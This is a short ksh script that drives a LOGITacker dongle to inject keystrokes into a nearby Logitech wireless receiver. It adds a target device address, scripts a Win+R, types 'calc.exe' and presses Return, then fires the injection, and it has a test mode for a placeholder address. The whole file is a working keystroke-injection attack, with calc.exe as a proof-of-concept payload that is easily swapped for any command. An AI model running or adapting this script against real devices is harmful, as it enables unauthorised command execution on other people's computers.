#!/bin/ksh

# check for /dev/ttyACM0
check_for_ACM0=$(ls -l /dev/ttyACM0)
if [[ -z $check_for_ACM0 ]]; then
  echo "Can't execute payload because dongle is not present on /dev/ttyACM0"
  exit 1
fi

# run this script to attach to /dev/ttyACM0 via screen in Linux and execute the payload
if [[ $1 = "AA:BB:CC:DD:EE" ]]; then
  echo "Test mode."
else
  screen -mdS "LOGITacker_screen" /dev/ttyACM0
  screen -x LOGITacker_screen -p 0 -X stuff "devices add ${1}"`echo -ne '\015'`
  screen -x LOGITacker_screen -p 0 -X stuff "script clear"`echo -ne '\015'`
  screen -x LOGITacker_screen -p 0 -X stuff "script press GUI R"`echo -ne '\015'`
  screen -x LOGITacker_screen -p 0 -X stuff "script delay 500"`echo -ne '\015'`
  screen -x LOGITacker_screen -p 0 -X stuff "script altstring calc.exe"`echo -ne '\015'`
  screen -x LOGITacker_screen -p 0 -X stuff "script press RETURN"`echo -ne '\015'`
  screen -x LOGITacker_screen -p 0 -X stuff "inject target ${1}"`echo -ne '\015'`
  screen -x LOGITacker_screen -p 0 -X stuff "inject execute"`echo -ne '\015'`
  echo "Payload executed."
fi

